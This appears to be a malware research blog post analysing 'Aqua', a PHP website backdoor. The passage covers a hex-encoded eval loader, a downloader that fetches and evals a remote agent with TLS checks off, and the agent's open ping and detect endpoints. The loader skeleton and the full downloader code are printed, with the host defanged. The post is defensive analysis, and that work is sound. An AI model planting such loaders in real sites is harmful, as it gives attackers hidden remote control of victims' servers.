---
title: Aqua - A Hex-Encoded Loader That Runs a Remote Site-Management Agent From Memory
url: https://lukeleal.com/research/posts/aqua-hex-loader-remote-site-management-agent/
source: Over Security
date: 2026-11-14
fetch_date: 2026-11-15T08:37:38.202739
---

# Aqua - A Hex-Encoded Loader That Runs a Remote Site-Management Agent From Memory

[# Cybersecurity Research 🚀](/research/posts/)

* Menu ▾
* + [Backdoors](https://lukeleal.com/research/tags/backdoor/)
  + [Phishing](https://lukeleal.com/research/tags/phishing/)
  + [Skimmers](https://lukeleal.com/research/tags/skimmer/)
  + [Past Research](https://blog.sucuri.net/author/luke)
  + [PGP Key](https://lukeleal.com/research/pages/pgp/)
  + [RSS](https://lukeleal.com/research/posts/index.xml)

* [Backdoors](https://lukeleal.com/research/tags/backdoor/)
* [Phishing](https://lukeleal.com/research/tags/phishing/)
* [Skimmers](https://lukeleal.com/research/tags/skimmer/)
* + ▾
  + - [Past Research](https://blog.sucuri.net/author/luke)
    - [PGP Key](https://lukeleal.com/research/pages/pgp/)
    - [RSS](https://lukeleal.com/research/posts/index.xml)

# [Aqua - A Hex-Encoded Loader That Runs a Remote Site-Management Agent From Memory](https://lukeleal.com/research/posts/aqua-hex-loader-remote-site-management-agent/)

2026-11-02Luke

#[Aqua](https://lukeleal.com/research/tags/aqua/)
#[hex2bin](https://lukeleal.com/research/tags/hex2bin/)
#[eval](https://lukeleal.com/research/tags/eval/)
#[loader](https://lukeleal.com/research/tags/loader/)
#[backdoor](https://lukeleal.com/research/tags/backdoor/)
#[SEO spam](https://lukeleal.com/research/tags/seo-spam/)
#[timestomping](https://lukeleal.com/research/tags/timestomping/)
#[PHP](https://lukeleal.com/research/tags/php/)
#[website malware](https://lukeleal.com/research/tags/website-malware/)
![Aqua - A Hex-Encoded Loader That Runs a Remote Site-Management Agent From Memory](https://lukeleal.com/research/aqua-hex-loader-cover-q90.jpg "Cover Image")

## Table of Contents

* [Layer 1: The Hex Loader](#layer-1-the-hex-loader)
* [Layer 2: The Downloader](#layer-2-the-downloader)
  + [The server](#the-server)
* [Layer 3: The “Aqua” Agent](#layer-3-the-aqua-agent)
  + [Finding the site root](#finding-the-site-root)
  + [Two requests anyone can make](#two-requests-anyone-can-make)
  + [The key is the same on every site](#the-key-is-the-same-on-every-site)
  + [Optional body encryption](#optional-body-encryption)
  + [What it can do](#what-it-can-do)
  + [The home page swap](#the-home-page-swap)
  + [Forced writes and hidden dates](#forced-writes-and-hidden-dates)
  + [SEO signs](#seo-signs)
  + [Hardening the site against others](#hardening-the-site-against-others)
* [Detection & Cleanup](#detection--cleanup)
* [IOCs](#iocs)
* [Samples](#samples)

The sample is **1,934 bytes**, six lines of PHP, and it was found today, 2026-11-02. It holds one long hex string, the word `hex2bin` stored as a string, and an `eval`. The hex decodes to a 922 byte downloader whose variable names are Japanese. The downloader fetches a **69,787 byte PHP file** from a Cloudflare-fronted domain and evaluates it.

That second file is a remote management agent for hacked sites. It speaks to its operator through a token check, has 19 actions, and carries 35 distinct Chinese-language status messages. It can write, rename and delete files, prepend code to `index.php` and `wp-login.php`, swap a home page, run any PHP the operator sends, and **set the modification time of everything it touches to a random date in 2020**.

> Nothing about the agent is stored on the site. The only file on disk is the 1.9 KB loader, and the agent is downloaded and evaluated again on every request.

I read all three layers statically. I decoded the hex with Python, fetched the agent once with `curl` and saved it without running it, and never executed any of it under PHP. Everything below about behavior comes from reading the code.

## Layer 1: The Hex Loader[#](#layer-1-the-hex-loader)

The whole file, minus the long string:

```
<?php
$_A9BzHv = '24e382a2e38389e383ace382b9203d2027...';   // 1,844 hex characters
$_CmNQF3 = 'hex2bin';
$_TxjZv = $_CmNQF3($_A9BzHv);
eval($_TxjZv);
?>
```

The function name is a string in a variable, so a search for `hex2bin(` or `eval(hex2bin` finds nothing. The call is `$_CmNQF3(...)`. The variable names look random, and so does the hex, so none of the three lines say what the file does. The hex decodes to exactly **922 bytes** of UTF-8.

## Layer 2: The Downloader[#](#layer-2-the-downloader)

Decoded, with the URL defanged:

```
$アドレス = 'hxxp://lxml[.]ahkj[.]lol/links-xml.txt'; $コード = '';
$コンテキスト = stream_context_create(['ssl' => ['verify_peer' => false, 'verify_peer_name' => false],
                                       'http' => ['timeout' => 10]]);

if (function_exists('curl_init')) {
    $ch = curl_init($アドレス);
    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0,
                            CURLOPT_FOLLOWLOCATION => 1, CURLOPT_TIMEOUT => 10]);
    $コード = curl_exec($ch); @curl_close($ch);
}
if (!$コード && ini_get('allow_url_fopen')) $コード = @file_get_contents($アドレス, false, $コンテキスト);
if (!$コード) { /* last resort: fopen() and fgets() in a loop */ }

if ($コード && strlen($コード) > 10) eval("?>" . $コード);
else echo "";
```

The identifiers are Katakana: `アドレス` is “address”, `コード` is “code”, `コンテキスト` is “context” and `ハンドル` is “handle”. The layer after this one speaks Chinese. I don’t draw a conclusion from that. It could be two authors, one tool, or a deliberate mix.

What matters is the logic:

* **Three ways to download.** cURL first, then `file_get_contents` if `allow_url_fopen` is on, then a manual `fopen` loop. A host that disabled one of them is still covered. TLS verification is off, though the URL is plain `http`.
* **`eval("?>" . $code)`**. The leading `?>` closes PHP mode, so the response is treated as a complete PHP file that begins with `<?php`. That is how a 1,750 line file can be evaluated as-is.
* **It fails silently.** A response of 10 bytes or fewer, an unreachable server, or a timeout all lead to `echo ""`. A site where the C2 is blocked or down keeps working and shows no error.
* **It’s never saved.** Unlike a loader that caches its payload as a hidden `.inc` file, this one downloads again each time the file is requested, so the operator can change the agent at any moment. Scanners that look at files on the server find the loader and not the agent.

### The server[#](#the-server)

| Item | Value |
| --- | --- |
| URL | `hxxp://lxml[.]ahkj[.]lol/links-xml.txt` |
| Domain registered | 2026-04-09, registrar Dynadot, expires 2027-04-09 |
| Name servers | `lila.ns.cloudflare.com`, `viddy.ns.cloudflare.com`. `lxml.ahkj.lol` resolves to Cloudflare addresses |
| Response | `200`, `Content-Type: text/plain`, 69,787 bytes, `Last-Modified: Thu, 15 Oct 2026 06:32:47 GMT` |
| Seen online | 2026-11-02, 23:26 UTC |

The file name `links-xml.txt` is dressed as a link list or sitemap. It is a PHP script served as plain text, so a browser shows the source and anyone can read it. That matters in the next section.

## Layer 3: The “Aqua” Agent[#](#layer-3-the-aqua-agent)

The agent is 1,750 lines and 17 functions, all named `aqua_...` (one with a leading underscore). Its error messages are in Chinese, for example `口令校验失败` (“password check failed”) and `目标路径非法` (“target path invalid”). The comments are Chinese too.

### Finding the site root[#](#finding-the-site-root)

An agent dropped in a subfolder still works on the whole site. It subtracts the folder part of `SCRIPT_NAME` from `SCRIPT_FILENAME`: a file at `/var/www/site/wp-content/x/a.php` requested as `/wp-content/x/a.php` gives the root `/var/www/site`. If that fails it falls back to `DOCUMENT_ROOT`, then to the file’s own folder. All file actions are then confined to that root.

### Two requests anyone can make[#](#two-requests-anyone-can-make)

Before the token check there are two open endpoints:

| Request | Reply |
| --- | --- |
| no `action`, or `action=ping` | the single character `1` |
| `action=detect` | `{"code":200,"is_wp":1,"cms":"WordPress","bundle":1,"detail":{"wp-load.php":1,"wp-blog-header.php":1}}` |

`is_wp` is 1 when both `wp-load.php` and `wp-blog-header.php` exist in the root; `cms` is `custom` otherwise. These replies are a fi...